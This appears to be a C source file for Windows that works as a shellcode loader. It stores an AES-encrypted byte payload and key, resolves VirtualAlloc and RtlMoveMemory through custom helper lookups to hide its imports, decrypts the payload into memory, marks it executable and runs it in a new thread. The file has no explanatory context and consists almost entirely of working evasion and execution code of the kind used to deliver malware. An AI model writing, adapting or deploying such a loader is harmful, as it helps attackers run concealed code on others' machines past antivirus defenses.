#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "helpers.h"

typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	return 0;
}

unsigned char payload[] = { 0xd2, 0x35, 0x97, 0xc0, 0x8a, 0x4f, 0x95, 0x88, 0x73, 0xbc, 0x4e, 0xa7, 0x1c, 0x29, 0x36, 0x43, 0x48, 0xdf, 0x9, 0x71, 0x61, 0xa7, 0xd1, 0x7d, 0xa8, 0xb1, 0x84, 0xc9, 0xa3, 0xba, 0xd6, 0x8d, 0x35, 0xe, 0xf1, 0x42, 0x7f, 0x63, 0x7f, 0x9c, 0x2b, 0xbf, 0x1, 0x57, 0xf1, 0x21, 0x49, 0x84, 0xe3, 0x7a, 0xa2, 0x4a, 0xbf, 0xbe, 0x9f, 0x5b, 0xd8, 0xb0, 0x8f, 0x38, 0xf2, 0x4b, 0xb8, 0xa5, 0xba, 0xf5, 0xb8, 0xd4, 0x74, 0x38, 0x50, 0x78, 0x4a, 0x45, 0x9a, 0xef, 0xf7, 0x8d, 0xd4, 0xde, 0x7, 0x5, 0xff, 0x86, 0xc8, 0x73, 0x4e, 0xe1, 0x7b, 0xf9, 0x4c, 0xd6, 0xf7, 0xd6, 0x34, 0x67, 0xe8, 0x47, 0xfb, 0xfc, 0xc, 0x55, 0xf4, 0x94, 0xa9, 0x21, 0xef, 0x9, 0xcb, 0xb0, 0xf8, 0x96, 0x2e, 0x19, 0xe4, 0xfd, 0x1a, 0x5c, 0x6a, 0x97, 0xfa, 0x97, 0x23, 0xc5, 0xea, 0x19, 0x48, 0x17, 0xee, 0x7f, 0x5d, 0xd6, 0x6e, 0xd7, 0xce, 0x97, 0x56, 0x47, 0xe4, 0xee, 0x6d, 0x2, 0x7f, 0x32, 0x29, 0xde, 0xf3, 0x9b, 0x97, 0xbe, 0x40, 0x32, 0x3b, 0x47, 0xa1, 0x80, 0x75, 0xe5, 0x61, 0x1e, 0x79, 0x46, 0xce, 0xe9, 0x4d, 0x5e, 0x97, 0x9d, 0x8d, 0x40, 0xcb, 0x7d, 0xea, 0x48, 0x67, 0x23, 0x6f, 0xde, 0x3a, 0x2b, 0x89, 0x61, 0xa6, 0xfc, 0x52, 0xcc, 0xa6, 0xc1, 0xd0, 0x68, 0xdd, 0x9d, 0xd, 0x30, 0x2f, 0xef, 0xda, 0xb9, 0xd1, 0xbb, 0x2e, 0xd6, 0x67, 0x11, 0xdf, 0x12, 0xe0, 0xe7, 0xcc, 0xdd, 0x6c, 0xc9, 0x95, 0x2f, 0x8b, 0x87, 0xb0, 0x8, 0x34, 0x15, 0x53, 0xce, 0x26, 0x75, 0x8e, 0x8d, 0xb5, 0xa4, 0xda, 0xa9, 0x8c, 0xc7, 0x15, 0xc4, 0x41, 0x80, 0x1b, 0xc7, 0x32, 0xf3, 0xce, 0x7, 0x1e, 0x69, 0xd9, 0x2f, 0xd2, 0xcc, 0xae, 0x3, 0x1d, 0xdf, 0xd3, 0x6, 0xd0, 0x93, 0x4a, 0x2f, 0x70, 0x1e, 0xb7, 0x6d, 0xab, 0xb7, 0xc0, 0xd6, 0x4e, 0xcc, 0x76, 0xdc, 0x76, 0xa4, 0x59, 0xd3, 0xe, 0xcd, 0xd0, 0x5b, 0x5b, 0x73, 0x73, 0xb6, 0x45, 0x1e, 0xcb, 0xcd, 0x2a, 0xc4, 0x6c, 0x81, 0x17, 0x24, 0x1b, 0x23, 0xb4, 0xb9, 0x4b, 0x55, 0x9a, 0xbc, 0x3d, 0x0, 0xfe, 0xdd, 0x6c, 0x73, 0xe0, 0x29, 0xd8, 0xd2, 0x3a, 0x53, 0x35, 0xb, 0xe4, 0x13, 0xd1, 0xab, 0x69, 0x46, 0xcf, 0x43, 0x7b, 0x2b, 0x91, 0x5a, 0xb2, 0x7a, 0xb0, 0x7, 0x71, 0x5d, 0xe9, 0xfc, 0x2a, 0xf1, 0x7a, 0x1d, 0x51, 0xbe, 0xb, 0xc2, 0x16, 0x6, 0xec, 0xd8, 0xd5, 0x11, 0x8f, 0x81, 0xf4, 0x8e, 0x6f, 0x69, 0xe, 0x22, 0x76, 0xdb, 0x39, 0x3, 0xd, 0x67, 0xdf, 0xbe, 0x31, 0x90, 0x6f, 0x7a, 0xe7, 0x9f, 0x76, 0x5b, 0xea, 0x58, 0xcd, 0xf5, 0x17, 0x7a, 0xb7, 0x5a, 0x4e, 0x96, 0x23, 0x24, 0x7b, 0x29, 0x5f, 0xa6, 0x96, 0x6e, 0x1c, 0x35, 0xfe, 0x54, 0x1b, 0xd6, 0x2f, 0x6d, 0x29, 0x89, 0x64, 0x8a, 0xe3, 0x48, 0xc7, 0xd2, 0xbe, 0x4f, 0xd3, 0xc9, 0xd3, 0xe7, 0xc4, 0x14, 0x60, 0xb6, 0xaa, 0x88, 0xde, 0x39, 0x58, 0xdd, 0x96, 0x1e, 0x3b, 0xd6, 0xd9, 0xa7, 0x5a, 0xfc, 0xdf, 0x91, 0xe7, 0x5e, 0xaf, 0x81, 0x63, 0x1d, 0xad, 0x18, 0x3a, 0xba, 0x2, 0xb3, 0x2b, 0xa5, 0xbb, 0x26, 0xab, 0x49, 0x36, 0xd1, 0xa6, 0x42, 0xaa, 0xc, 0x11, 0x3a, 0x16, 0x69, 0xf4, 0x7e, 0x84, 0x77 };
unsigned char key[] = { 0x99, 0x9, 0x14, 0x4b, 0xf9, 0xde, 0xfe, 0xd1, 0xd9, 0x61, 0xd6, 0x4f, 0x81, 0x5d, 0x26, 0x25 };	


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
	unsigned int payload_len = sizeof(payload);
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	pRtlMoveMemory(exec_mem, payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}
	return 0;
}
